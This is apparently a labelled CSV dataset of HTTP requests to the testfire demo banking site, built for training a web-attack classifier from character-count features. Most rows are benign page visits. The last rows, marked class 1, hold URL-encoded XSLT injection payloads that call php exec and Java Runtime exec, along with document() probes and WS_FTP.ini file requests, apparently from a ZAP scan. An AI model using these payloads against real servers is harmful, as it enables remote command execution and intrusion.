method,path,body,single_q,double_q,dashes,braces,spaces,percentages,semicolons,angle_brackets,special_chars,path_length,body_length,badwords_count,class
GET,/index.jsp?content=personal_savings.htm,,0,0,0,0,0,0,0,0,0,39,0,0,0
GET,/index.jsp,,0,0,0,0,0,0,0,0,0,10,0,0,0
GET,/default.jsp?content=security.htm,,0,0,0,0,0,0,0,0,0,33,0,0,0
GET,/index.jsp,,0,0,0,0,0,0,0,0,0,10,0,0,0
GET,/swagger/index.html,,0,0,0,0,0,0,0,0,0,19,0,0,0
GET,/index.jsp,,0,0,0,0,0,0,0,0,0,10,0,0,0
GET,/search.jsp?query=,,0,0,0,0,0,0,0,0,0,18,0,0,0
GET,/index.jsp,,0,0,0,0,0,0,0,0,0,10,0,0,0
GET,/search.jsp?query=882901,,0,0,0,0,0,0,0,0,0,24,0,0,0
GET,/index.jsp,,0,0,0,0,0,0,0,0,0,10,0,0,0
GET,/feedback.jsp,,0,0,0,0,0,0,0,0,0,13,0,0,0
GET,/index.jsp,,0,0,0,0,0,0,0,0,0,10,0,0,0
GET,/index.jsp?content=personal_deposit.htm,,0,0,0,0,0,0,0,0,0,39,0,0,0
GET,/index.jsp,,0,0,0,0,0,0,0,0,0,10,0,0,0
GET,/index.jsp?content=business_deposit.htm,,0,0,0,0,0,0,0,0,0,39,0,0,0
GET,/index.jsp,,0,0,0,0,0,0,0,0,0,10,0,0,0
GET,/index.jsp?content=business_insurance.htm,,0,0,0,0,0,0,0,0,0,41,0,0,0
GET,/index.jsp,,0,0,0,0,0,0,0,0,0,10,0,0,0
GET,/index.jsp?content=business_retirement.htm,,0,0,0,0,0,0,0,0,0,42,0,0,0
GET,/index.jsp,,0,0,0,0,0,0,0,0,0,10,0,0,0
GET,/survey_questions.jsp,,0,0,0,0,0,0,0,0,0,21,0,0,0
GET,/index.jsp,,0,0,0,0,0,0,0,0,0,10,0,0,0
GET,/status_check.jsp,,0,0,0,0,0,0,0,0,0,17,0,0,0
GET,/index.jsp,,0,0,0,0,0,0,0,0,0,10,0,0,0
GET,/index.jsp?content=inside.htm,,0,0,0,0,0,0,0,0,0,29,0,0,0
GET,/index.jsp,,0,0,0,0,0,0,0,0,0,10,0,0,0
GET,/subscribe.jsp,,0,0,0,0,0,0,0,0,0,14,0,0,0
GET,/index.jsp,,0,0,0,0,0,0,0,0,0,10,0,0,0
GET,/index.jsp?content=inside_about.htm,,0,0,0,0,0,0,0,0,0,35,0,0,0
GET,/login.jsp,,0,0,0,0,0,0,0,0,0,10,0,0,0
GET,/subscribe.jsp,,0,0,0,0,0,0,0,0,0,14,0,0,0
GET,/index.jsp,,0,0,0,0,0,0,0,0,0,10,0,0,0
GET,/index.jsp?content=inside_careers.htm,,0,0,0,0,0,0,0,0,0,37,0,0,0
GET,/index.jsp,,0,0,0,0,0,0,0,0,0,10,0,0,0
GET,/index.jsp?content=inside_press.htm,,0,0,0,0,0,0,0,0,0,35,0,0,0
GET,/index.jsp?content=inside_contact.htm,,0,0,0,0,0,0,0,0,0,37,0,0,0
GET,/disclaimer.htm?url=http%3a%2f%2fwww.netscape.com,,0,0,0,0,0,0,0,0,0,43,0,0,0
GET,/disclaimer.htm?url=http%3a%2f%2fwww.netscape.com,,0,0,0,0,0,0,0,0,0,43,0,0,0
GET,/index.jsp?content=inside.htm,,0,0,0,0,0,0,0,0,0,29,0,0,0
GET,/index.jsp?content=inside_community.htm,,0,0,0,0,0,0,0,0,0,39,0,0,0
GET,/index.jsp?content=inside_volunteering.htm,,0,0,0,0,0,0,0,0,0,42,0,0,0
GET,/index.jsp?content=inside.htm,,0,0,0,0,0,0,0,0,0,29,0,0,0
GET,/index.jsp?content=inside_community.htm,,0,0,0,0,0,0,0,0,0,39,0,0,0
GET,/pr/communityannualreport.pdf,,0,0,0,0,0,0,0,0,0,29,0,0,0
GET,/index.jsp?content=business_deposit.htm,,0,0,0,0,0,0,0,0,0,39,0,0,0
GET,/high_yield_investments.htm,,0,0,0,0,0,0,0,0,0,27,0,0,0
GET,/default.jsp,,0,0,0,0,0,0,0,0,0,12,0,0,0
GET,/index.jsp?content=inside_careers.htm,,0,0,0,0,0,0,0,0,0,37,0,0,0
GET,/index.jsp?content=inside_jobs.htm,,0,0,0,0,0,0,0,0,0,34,0,0,0
GET,/index.jsp?content=inside_jobs.htm&job=ExecutiveAssistant%3aAdministration,,0,0,0,0,0,0,0,0,0,72,0,1,0
GET,/index.jsp?content=inside_careers.htm,,0,0,0,0,0,0,0,0,0,37,0,0,0
GET,/index.jsp?content=inside_jobs.htm,,0,0,0,0,0,0,0,0,0,34,0,0,0
GET,/index.jsp?content=inside_jobs.htm&job=Teller%3aConsumaerBanking,,0,0,0,0,0,0,0,0,0,62,0,0,0
GET,/index.jsp?content=inside_careers.htm,,0,0,0,0,0,0,0,0,0,37,0,0,0
GET,/index.jsp?content=inside_jobs.htm,,0,0,0,0,0,0,0,0,0,34,0,0,0
GET,/index.jsp?content=inside_jobs.htm&job=CustomerServiceRepresentative%3aCustomerService,,0,0,0,0,0,0,0,0,0,84,0,0,0
GET,/index.jsp?content=inside_careers.htm,,0,0,0,0,0,0,0,0,0,37,0,0,0
GET,/index.jsp?content=inside_jobs.htm,,0,0,0,0,0,0,0,0,0,34,0,0,0
GET,/index.jsp?content=inside_jobs.htm&job=LoyaltyMarketingProgramManager%3aMarketing,,0,0,0,0,0,0,0,0,0,79,0,0,0
GET,/index.jsp?content=inside_careers.htm,,0,0,0,0,0,0,0,0,0,37,0,0,0
GET,/index.jsp?content=inside_jobs.htm,,0,0,0,0,0,0,0,0,0,34,0,0,0
GET,/index.jsp?content=inside_jobs.htm&job=OperationalRiskManager%3aRiskManagement,,0,0,0,0,0,0,0,0,0,76,0,0,0
GET,/index.jsp?content=inside_careers.htm,,0,0,0,0,0,0,0,0,0,37,0,0,0
GET,/index.jsp?content=inside_jobs.htm,,0,0,0,0,0,0,0,0,0,34,0,0,0
GET,/index.jsp?content=inside_jobs.htm&job=MortgageLendingAccountExecutive%3aSales,,0,0,0,0,0,0,0,0,0,76,0,0,0
GET,/index.jsp?content=inside_careers.htm,,0,0,0,0,0,0,0,0,0,37,0,0,0
GET,/index.jsp?content=inside_internships.htm,,0,0,0,0,0,0,0,0,0,41,0,0,0
GET,/index.jsp?content=inside_jobs.htm,,0,0,0,0,0,0,0,0,0,34,0,0,0
GET,/survey_questions.jsp,,0,0,0,0,0,0,0,0,0,21,0,0,0
GET,/survey_questions.jsp?step=a,,0,0,0,0,0,0,0,0,0,28,0,0,0
GET,/survey_questions.jsp?step=b,,0,0,0,0,0,0,0,0,0,28,0,0,0
GET,/index.jsp?content=inside_contact.htm,,0,0,0,0,0,0,0,0,0,37,0,0,0
GET,/disclaimer.htm?url=http%3a%2f%2fwww.microsoft.com,,0,0,0,0,0,0,0,0,0,44,0,0,0
GET,/disclaimer.htm?url=http%3a%2f%2fwww.microsoft.com,,0,0,0,0,0,0,0,0,0,44,0,0,0
GET,/index.jsp?content=business_deposit.htm,,0,0,0,0,0,0,0,0,0,39,0,0,0
GET,/high_yield_investments.htm,,0,0,0,0,0,0,0,0,0,27,0,0,0
GET,/index.jsp?content=personal.htm,,0,0,0,0,0,0,0,0,0,31,0,0,0
GET,/index.jsp?content=business_deposit.htm,,0,0,0,0,0,0,0,0,0,39,0,0,0
GET,/high_yield_investments.htm,,0,0,0,0,0,0,0,0,0,27,0,0,0
GET,/index.jsp?content=business.htm,,0,0,0,0,0,0,0,0,0,31,0,0,0
GET,/index.jsp?content=business_deposit.htm,,0,0,0,0,0,0,0,0,0,39,0,0,0
GET,/high_yield_investments.htm,,0,0,0,0,0,0,0,0,0,27,0,0,0
GET,/index.jsp?content=personal_checking.htm,,0,0,0,0,0,0,0,0,0,40,0,0,0
GET,/index.jsp?content=business_deposit.htm,,0,0,0,0,0,0,0,0,0,39,0,0,0
GET,/high_yield_investments.htm,,0,0,0,0,0,0,0,0,0,27,0,0,0
GET,/index.jsp?content=personal_loans.htm,,0,0,0,0,0,0,0,0,0,37,0,0,0
GET,/index.jsp?content=business_deposit.htm,,0,0,0,0,0,0,0,0,0,39,0,0,0
GET,/high_yield_investments.htm,,0,0,0,0,0,0,0,0,0,27,0,0,0
GET,/index.jsp?content=personal_cards.htm,,0,0,0,0,0,0,0,0,0,37,0,0,0
GET,/index.jsp?content=business_deposit.htm,,0,0,0,0,0,0,0,0,0,39,0,0,0
GET,/high_yield_investments.htm,,0,0,0,0,0,0,0,0,0,27,0,0,0
GET,/index.jsp?content=personal_investments.htm,,0,0,0,0,0,0,0,0,0,43,0,0,0
GET,/index.jsp?content=business_deposit.htm,,0,0,0,0,0,0,0,0,0,39,0,0,0
GET,/high_yield_investments.htm,,0,0,0,0,0,0,0,0,0,27,0,0,0
GET,/index.jsp?content=personal_other.htm,,0,0,0,0,0,0,0,0,0,37,0,0,0
GET,/index.jsp?content=business_deposit.htm,,0,0,0,0,0,0,0,0,0,39,0,0,0
GET,/high_yield_investments.htm,,0,0,0,0,0,0,0,0,0,27,0,0,0
GET,/index.jsp?content=business_lending.htm,,0,0,0,0,0,0,0,0,0,39,0,0,0
GET,/index.jsp?content=business_deposit.htm,,0,0,0,0,0,0,0,0,0,39,0,0,0
GET,/high_yield_investments.htm,,0,0,0,0,0,0,0,0,0,27,0,0,0
GET,/cgi.exe,,0,0,0,0,0,0,0,0,0,8,0,0,0
GET,/index.jsp?content=business_deposit.htm,,0,0,0,0,0,0,0,0,0,39,0,0,0
GET,/high_yield_investments.htm,,0,0,0,0,0,0,0,0,0,27,0,0,0
GET,/index.jsp?content=inside_investor.htm,,0,0,0,0,0,0,0,0,0,38,0,0,0
GET,/index.jsp?content=business_deposit.htm,,0,0,0,0,0,0,0,0,0,39,0,0,0
GET,/high_yield_investments.htm,,0,0,0,0,0,0,0,0,0,27,0,0,0
GET,/security.htm,,0,0,0,0,0,0,0,0,0,13,0,0,0
GET,/index.jsp?content=business_deposit.htm,,0,0,0,0,0,0,0,0,0,39,0,0,0
GET,/high_yield_investments.htm,,0,0,0,0,0,0,0,0,0,27,0,0,0
GET,/login.jsp,,0,0,0,0,0,0,0,0,0,10,0,0,0
GET,/index.jsp?content=business_deposit.htm,,0,0,0,0,0,0,0,0,0,39,0,0,0
GET,/high_yield_investments.htm,,0,0,0,0,0,0,0,0,0,27,0,0,0
GET,/feedback.jsp,,0,0,0,0,0,0,0,0,0,13,0,0,0
GET,/index.jsp?content=business_deposit.htm,,0,0,0,0,0,0,0,0,0,39,0,0,0
GET,/high_yield_investments.htm,,0,0,0,0,0,0,0,0,0,27,0,0,0
GET,/index.jsp?content=personal_deposit.htm,,0,0,0,0,0,0,0,0,0,39,0,0,0
GET,/index.jsp?content=business_deposit.htm,,0,0,0,0,0,0,0,0,0,39,0,0,0
GET,/high_yield_investments.htm,,0,0,0,0,0,0,0,0,0,27,0,0,0
GET,/index.jsp?content=business_cards.htm,,0,0,0,0,0,0,0,0,0,37,0,0,0
GET,/index.jsp?content=business_deposit.htm,,0,0,0,0,0,0,0,0,0,39,0,0,0
GET,/high_yield_investments.htm,,0,0,0,0,0,0,0,0,0,27,0,0,0
GET,/index.jsp?content=business_insurance.htm,,0,0,0,0,0,0,0,0,0,41,0,0,0
GET,/index.jsp?content=business_deposit.htm,,0,0,0,0,0,0,0,0,0,39,0,0,0
GET,/high_yield_investments.htm,,0,0,0,0,0,0,0,0,0,27,0,0,0
GET,/index.jsp?content=business_retirement.htm,,0,0,0,0,0,0,0,0,0,42,0,0,0
GET,/index.jsp?content=business_deposit.htm,,0,0,0,0,0,0,0,0,0,39,0,0,0
GET,/high_yield_investments.htm,,0,0,0,0,0,0,0,0,0,27,0,0,0
GET,/index.jsp?content=business_other.htm,,0,0,0,0,0,0,0,0,0,37,0,0,0
GET,/index.jsp?content=business_insurance.htm,,0,0,0,0,0,0,0,0,0,41,0,0,0
GET,/index.jsp?content=business_insurance.htm,,0,0,0,0,0,0,0,0,0,41,0,0,0
GET,/index.jsp?content=business_insurance.htm,,0,0,0,0,0,0,0,0,0,41,0,0,0
GET,/index.jsp?content=business_insurance.htm,,0,0,0,0,0,0,0,0,0,41,0,0,0
GET,/index.jsp?content=business_insurance.htm,,0,0,0,0,0,0,0,0,0,41,0,0,0
GET,/index.jsp?content=business_insurance.htm,,0,0,0,0,0,0,0,0,0,41,0,0,0
GET,/index.jsp?content=business_insurance.htm,,0,0,0,0,0,0,0,0,0,41,0,0,0
GET,/index.jsp?content=business_insurance.htm,,0,0,0,0,0,0,0,0,0,41,0,0,0
GET,/index.jsp?content=business_insurance.htm,,0,0,0,0,0,0,0,0,0,41,0,0,0
GET,/index.jsp?content=business_insurance.htm,,0,0,0,0,0,0,0,0,0,41,0,0,0
GET,/index.jsp?content=business_insurance.htm,,0,0,0,0,0,0,0,0,0,41,0,0,0
GET,/index.jsp?content=business_insurance.htm,,0,0,0,0,0,0,0,0,0,41,0,0,0
GET,/index.jsp?content=business_deposit.htm,,0,0,0,0,0,0,0,0,0,39,0,0,0
GET,/high_yield_investments.htm,,0,0,0,0,0,0,0,0,0,27,0,0,0
GET,/index.jsp?content=inside_contact.htm,,0,0,0,0,0,0,0,0,0,37,0,0,0
GET,/index.jsp?content=business_deposit.htm,,0,0,0,0,0,0,0,0,0,39,0,0,0
GET,/high_yield_investments.htm,,0,0,0,0,0,0,0,0,0,27,0,0,0
GET,/index.jsp?content=inside_about.htm,,0,0,0,0,0,0,0,0,0,35,0,0,0
GET,/index.jsp?content=business_insurance.htm,,0,0,0,0,0,0,0,0,0,41,0,0,0
GET,/index.jsp?content=business_insurance.htm,,0,0,0,0,0,0,0,0,0,41,0,0,0
GET,/index.jsp?content=business_insurance.htm,,0,0,0,0,0,0,0,0,0,41,0,0,0
GET,/index.jsp?content=business_deposit.htm,,0,0,0,0,0,0,0,0,0,39,0,0,0
GET,/high_yield_investments.htm,,0,0,0,0,0,0,0,0,0,27,0,0,0
GET,/index.jsp?content=inside.htm,,0,0,0,0,0,0,0,0,0,29,0,0,0
GET,/index.jsp?content=business_insurance.htm,,0,0,0,0,0,0,0,0,0,41,0,0,0
GET,/index.jsp?content=business_insurance.htm,,0,0,0,0,0,0,0,0,0,41,0,0,0
GET,/index.jsp?content=business_insurance.htm,,0,0,0,0,0,0,0,0,0,41,0,0,0
GET,/index.jsp?content=business_deposit.htm,,0,0,0,0,0,0,0,0,0,39,0,0,0
GET,/high_yield_investments.htm,,0,0,0,0,0,0,0,0,0,27,0,0,0
GET,/index.jsp?content=inside_press.htm,,0,0,0,0,0,0,0,0,0,35,0,0,0
GET,/index.jsp?content=business_insurance.htm,,0,0,0,0,0,0,0,0,0,41,0,0,0
GET,/index.jsp?content=business_deposit.htm,,0,0,0,0,0,0,0,0,0,39,0,0,0
GET,/high_yield_investments.htm,,0,0,0,0,0,0,0,0,0,27,0,0,0
GET,/index.jsp?content=inside_careers.htm,,0,0,0,0,0,0,0,0,0,37,0,0,0
GET,/index.jsp?content=business_insurance.htm,,0,0,0,0,0,0,0,0,0,41,0,0,0
GET,/index.jsp?content=business_insurance.htm,,0,0,0,0,0,0,0,0,0,41,0,0,0
GET,/index.jsp?content=business_deposit.htm,,0,0,0,0,0,0,0,0,0,39,0,0,0
GET,/high_yield_investments.htm,,0,0,0,0,0,0,0,0,0,27,0,0,0
GET,/index.jsp?content=business_deposit.htm,,0,0,0,0,0,0,0,0,0,39,0,0,0
POST,/doLogin,uid=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Fdemo.testfire.net%3A22%27%29%22%2F%3E&passw=ZAP&btnSubmit=Login,2,2,0,1,1,0,0,2,0,8,94,2,1
GET,/disclaimer.htm?url=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,,4,2,0,1,2,0,1,3,0,94,0,1,1
GET,/default.jsp?content=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,,4,2,0,1,2,0,1,3,0,95,0,1,1
POST,/doSubscribe,txtEmail=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Fdemo.testfire.net%3A22%27%29%22%2F%3E&btnSubmit=Subscribe,2,2,0,1,1,0,0,2,0,12,93,1,1
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=system-property%28%27xsl%3Avendor%27%29%2F%3E,,2,0,0,1,3,0,0,1,0,93,0,1,1
GET,/index.jsp?content=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Fdemo.testfire.net%3A22%27%29%22%2F%3E,,2,2,0,1,1,0,0,2,0,83,0,1,1
GET,/Privacypolicy.jsp?sec=Careers&template=%3C,,0,0,0,0,0,0,0,1,0,41,0,0,1
GET,/index.jsp?content=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Fdemo.testfire.net%3A22%27%29%22%2F%3E&job=MortgageLendingAccountExecutive%3ASales,,2,2,0,1,1,0,0,2,0,125,0,1,1
GET,/static/index.jsp?content=%3C,,0,0,0,0,0,0,0,1,0,27,0,0,1
GET,/search.jsp?query=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,,2,2,0,1,1,0,0,2,0,72,0,2,1
POST,/sendFeedback,cfile=comments.txt&name=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,2,3,1,1,8,0,0,4,0,13,182,2,1
GET,/WS_FTP.ini,,0,0,0,0,0,0,0,0,0,11,0,0,1
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,,2,3,1,1,4,0,0,4,0,123,0,2,1
GET,/index.jsp?content=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,,2,14,0,3,7,0,0,8,0,264,0,5,1
GET,/survey_questions.jsp?step=%3C,,0,0,0,0,0,0,0,1,0,28,0,0,1
GET,/index.jsp?content=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E&job=MortgageLendingAccountExecutive%3ASales,,2,14,0,3,7,0,0,8,0,306,0,5,1
GET,/Privacypolicy.jsp?sec=Careers&template=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,,2,2,0,1,1,0,0,2,0,94,0,2,1
GET,/static/index.jsp?content=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,,2,2,0,1,1,0,0,2,0,80,0,2,1
GET,/search.jsp?query=system-property%28%27xsl%3Avendor%27%29%2F%3E,,2,0,0,1,0,0,0,1,0,49,0,1,1
POST,/doLogin,uid=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E&passw=ZAP&btnSubmit=Login,2,14,0,3,7,0,0,8,0,8,275,6,1
GET,/ws_ftp.ini,,0,0,0,0,0,0,0,0,0,11,0,0,1
POST,/doSubscribe,txtEmail=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E&btnSubmit=Subscribe,2,14,0,3,7,0,0,8,0,12,274,5,1
